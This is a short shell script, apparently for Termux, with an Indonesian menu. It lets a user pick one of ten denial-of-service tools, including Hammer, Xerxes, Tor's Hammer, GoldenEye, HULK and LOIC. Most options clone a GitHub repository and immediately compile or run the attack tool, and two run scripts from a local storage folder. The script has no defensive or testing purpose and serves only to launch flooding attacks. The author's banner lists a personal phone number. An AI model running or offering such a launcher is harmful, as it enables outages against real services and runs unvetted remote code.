#!/bin/sh

echo  "  _________________________________________"
echo  " |           WELCOME TO Tya-Ar            |"
echo  " |        github : github.com/Tya-Ar      |"
echo  " |        WA     : 088247967789           |"
echo  " |        FB     : Tya Ar                 |"
echo  " |             solo player                |"
echo  " |<-------------------------------------->|"
sleep 1

echo "             1.HAMMER DDOS "
echo "             2.DDOS XERXES"
echo "             3.LITEDDOS "
echo "             4.TORS Hammer"
echo "             5.HUNNER DDOS"
echo "             6.Golden EYES DDOS"
echo "             7.HULK Smash"
echo "             8.IP-ATTACKS"
echo "             9.LOIC"
echo "            10.ARMAGEDDON DDOS"
echo "            11.KELUAR"
echo
read -p"Masukan pilihan : " pil

if [ $pil = 1 ]
then
clear
git clone https://github.com/cyweb/hammer
cd hammer
python3 hammer.py
fi

if [ $pil = 2 ]
then
clear
apt install clang
git clone https://github.com/zanyarjamal/xerxes
cd xerxes
clang xerxes.c -o xerxes
./xerxes
fi

if [ $pil = 3 ]
then
clear
git clone https://github.com/4L13199/LITEDDOS
cd LITEDDOS
python2 liteDDOS.py
fi

if [ $pil = 4 ]
then
clear
apt install tor
git clone https://github.com/dotfighter/torshammer
cd torshammer
python2 torshammer.py
fi

if [ $pil = 5 ]
then
clear
git clone https://github.com/b3-v3r/Hunner
cd hunner
python hunner.py
fi

if [ $pil = 6 ]
then
clear
git clone https://github.com/jseidl/GoldenEye
cd GoldenEye
python2 goldeneye.py
fi

if [ $pil = 7 ]
then
clear
git clone https://github.com/grafov/hulk
cd hulk
python hulk.py
fi

if [ $pil = 8 ]
then
clear
git clone https://github.com/Bhai4You/Ip-Attack
cd Ip-Attack
python ip-attack.py
fi

if [ $pil = 9 ]
then
clear
termux-setup-storage
cd /sdcard/BloodsTools71/10Attack/5
python2 LO1C.py
fi

if [ $pil = 10 ]
then
clear
termux-setup-storage
cd /sdcard/BloodsTools71/10Attack/5
python2 arma.py
fi


if [ $pil = 11 ]
then
clear
echo "Terima Kasih sudh pakai Tools saya ^_^"
sleep 2
echo "Kalau Ada error silahkan hubungi saya di WA"
sleep 2
echo "FACEBOOK : Tya Ar "
echo "Whatsapp : 088247967789 "
fi
